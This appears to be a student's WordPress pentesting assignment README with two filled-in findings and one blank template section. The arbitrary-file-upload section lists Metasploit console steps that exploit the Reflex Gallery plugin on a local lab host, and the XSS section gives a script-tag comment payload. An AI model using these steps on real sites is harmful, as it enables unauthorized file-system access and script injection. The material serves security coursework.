# Project 7 - WordPress Pentesting

Time spent: **10** hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. Arbitrary File Upload
  - [x] Summary: Using Metasploit, allows the user to gain access to the file system.
    - Vulnerability types: Arbitrary File Upload
    - Tested in version: 3.1.3 (Reflex Gallery)
    - Fixed in version: 3.1.4 (Reflex Gallery)
  - [x] GIF Walkthrough: <img src="arbitrary_file.gif">
  - [x] Steps to recreate: 
	1. ```server postgresql start```
	2. ```msfdb init```
	3. ```msfconsole```
	4. At this point, you will be inside of the Metasploit console
	5. ```db_status``` (If it reads Connected to msf, you're good to go)
	6. ```search Reflex```
	7. ```use 0```
	8. ```set RHOST 127.0.0.1```
	9. ```set RPORT 8080```
	10. ```set LHOST 192.168.65.3``` (Different in some cases, it's eth0 under ifconfig)
	11. ```exploit``` (this will gain you access to the file system to edit php files)
	
### 2. XSS Comment (Authorized)
  - [x] Summary: 
    - Vulnerability types: XSS using comments that are authorized on WP
    - Tested in version: 4.1
    - Fixed in version: 4.1.26
  - [x] GIF Walkthrough: <img src="XSS_Comment_Scripting.gif">
  - [x] Steps to recreate: 
	1. **Login to Admin account on WordPress**
	2. **Find a comment to post on**
	3. **Post a javascript tag in the comment box**
	4. Example: ```<script>alert('XSS!');</script>```
### 3. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: -

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with Screen To GIF

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.